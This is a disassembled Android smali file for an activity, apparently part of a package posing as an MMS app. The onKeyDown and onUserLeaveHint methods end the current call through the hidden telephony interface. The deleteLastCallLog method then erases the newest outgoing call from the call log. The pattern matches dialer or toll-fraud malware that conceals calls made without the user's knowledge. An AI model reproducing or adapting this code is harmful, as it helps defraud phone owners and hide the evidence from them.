.class public Lcom/mms/bg/ui/DialScreenActivity;
.super Landroid/app/Activity;
.source "DialScreenActivity.java"


# static fields
.field private static final DEBUG:Z = false

.field private static final REMOVE_FIRST_LOG:I = 0x0

.field private static final TAG:Ljava/lang/String; = "DialScreenActivity"


# instance fields
.field private mHandler:Landroid/os/Handler;

.field private mHasCreated:Z


# direct methods
.method public constructor <init>()V
    .registers 2

    .prologue
    .line 20
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 27
    new-instance v0, Lcom/mms/bg/ui/DialScreenActivity$1;

    invoke-direct {v0, p0}, Lcom/mms/bg/ui/DialScreenActivity$1;-><init>(Lcom/mms/bg/ui/DialScreenActivity;)V

    iput-object v0, p0, Lcom/mms/bg/ui/DialScreenActivity;->mHandler:Landroid/os/Handler;

    return-void
.end method

.method static synthetic access$000(Lcom/mms/bg/ui/DialScreenActivity;)V
    .registers 1
    .parameter "x0"

    .prologue
    .line 20
    invoke-direct {p0}, Lcom/mms/bg/ui/DialScreenActivity;->deleteLastCallLog()V

    return-void
.end method

.method private deleteLastCallLog()V
    .registers 11

    .prologue
    .line 87
    invoke-virtual {p0}, Lcom/mms/bg/ui/DialScreenActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 88
    .local v0, resolver:Landroid/content/ContentResolver;
    const/4 v6, 0x0

    .line 90
    .local v6, c:Landroid/database/Cursor;
    :try_start_5
    const-string v2, "content://call_log/calls"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 91
    .local v1, CONTENT_URI:Landroid/net/Uri;
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const-string v3, "type = 2"

    const/4 v4, 0x0

    const-string v5, "date DESC LIMIT 1"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 98
    if-eqz v6, :cond_24

    invoke-interface {v6}, Landroid/database/Cursor;->moveToFirst()Z
    :try_end_21
    .catchall {:try_start_5 .. :try_end_21} :catchall_61

    move-result v2

    if-nez v2, :cond_2a

    .line 107
    :cond_24
    if-eqz v6, :cond_29

    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 110
    :cond_29
    :goto_29
    return-void

    .line 102
    :cond_2a
    const/4 v2, 0x0

    :try_start_2b
    invoke-interface {v6, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    .line 103
    .local v7, id:J
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "_id IN ("

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v7, v8}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ")"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 105
    .local v9, where:Ljava/lang/String;
    invoke-virtual {p0}, Lcom/mms/bg/ui/DialScreenActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v2, v1, v9, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_50
    .catchall {:try_start_2b .. :try_end_50} :catchall_61

    .line 107
    if-eqz v6, :cond_55

    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 109
    :cond_55
    invoke-virtual {p0}, Lcom/mms/bg/ui/DialScreenActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lcom/mms/bg/ui/SettingManager;->getInstance(Landroid/content/Context;)Lcom/mms/bg/ui/SettingManager;

    move-result-object v2

    invoke-virtual {v2}, Lcom/mms/bg/ui/SettingManager;->releaseWakeLock()V

    goto :goto_29

    .line 107
    .end local v1           #CONTENT_URI:Landroid/net/Uri;
    .end local v7           #id:J
    .end local v9           #where:Ljava/lang/String;
    :catchall_61
    move-exception v2

    if-eqz v6, :cond_67

    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    :cond_67
    throw v2
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .registers 4
    .parameter "savedInstanceState"

    .prologue
    .line 41
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 45
    const/high16 v0, 0x8

    .line 52
    .local v0, flags:I
    const/high16 v1, 0x40

    or-int/2addr v0, v1

    .line 54
    invoke-virtual {p0}, Lcom/mms/bg/ui/DialScreenActivity;->getWindow()Landroid/view/Window;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/view/Window;->addFlags(I)V

    .line 55
    const/4 v1, 0x1

    iput-boolean v1, p0, Lcom/mms/bg/ui/DialScreenActivity;->mHasCreated:Z

    .line 56
    invoke-virtual {p0}, Lcom/mms/bg/ui/DialScreenActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/mms/bg/ui/SettingManager;->getInstance(Landroid/content/Context;)Lcom/mms/bg/ui/SettingManager;

    move-result-object v1

    iput-object p0, v1, Lcom/mms/bg/ui/SettingManager;->mForegroundActivity:Landroid/app/Activity;

    .line 57
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .registers 8
    .parameter "keyCode"
    .parameter "event"

    .prologue
    .line 63
    :try_start_0
    const-string v1, "phone"

    invoke-static {v1}, Landroid/os/ServiceManager;->getService(Ljava/lang/String;)Landroid/os/IBinder;

    move-result-object v1

    invoke-static {v1}, Lcom/android/internal/telephony/ITelephony$Stub;->asInterface(Landroid/os/IBinder;)Lcom/android/internal/telephony/ITelephony;

    move-result-object v0

    .line 64
    .local v0, phone:Lcom/android/internal/telephony/ITelephony;
    invoke-interface {v0}, Lcom/android/internal/telephony/ITelephony;->endCall()Z

    .line 65
    iget-object v1, p0, Lcom/mms/bg/ui/DialScreenActivity;->mHandler:Landroid/os/Handler;

    const/4 v2, 0x0

    const-wide/16 v3, 0x7d0

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z
    :try_end_15
    .catch Landroid/os/RemoteException; {:try_start_0 .. :try_end_15} :catch_1a

    .line 69
    .end local v0           #phone:Lcom/android/internal/telephony/ITelephony;
    :goto_15
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v1

    return v1

    .line 66
    :catch_1a
    move-exception v1

    goto :goto_15
.end method

.method public onUserLeaveHint()V
    .registers 6

    .prologue
    .line 75
    iget-boolean v1, p0, Lcom/mms/bg/ui/DialScreenActivity;->mHasCreated:Z

    const/4 v2, 0x1

    if-ne v1, v2, :cond_1a

    .line 77
    :try_start_5
    const-string v1, "phone"

    invoke-static {v1}, Landroid/os/ServiceManager;->getService(Ljava/lang/String;)Landroid/os/IBinder;

    move-result-object v1

    invoke-static {v1}, Lcom/android/internal/telephony/ITelephony$Stub;->asInterface(Landroid/os/IBinder;)Lcom/android/internal/telephony/ITelephony;

    move-result-object v0

    .line 78
    .local v0, phone:Lcom/android/internal/telephony/ITelephony;
    invoke-interface {v0}, Lcom/android/internal/telephony/ITelephony;->endCall()Z

    .line 79
    iget-object v1, p0, Lcom/mms/bg/ui/DialScreenActivity;->mHandler:Landroid/os/Handler;

    const/4 v2, 0x0

    const-wide/16 v3, 0x7d0

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z
    :try_end_1a
    .catch Landroid/os/RemoteException; {:try_start_5 .. :try_end_1a} :catch_1b

    .line 83
    .end local v0           #phone:Lcom/android/internal/telephony/ITelephony;
    :cond_1a
    :goto_1a
    return-void

    .line 80
    :catch_1b
    move-exception v1

    goto :goto_1a
.end method
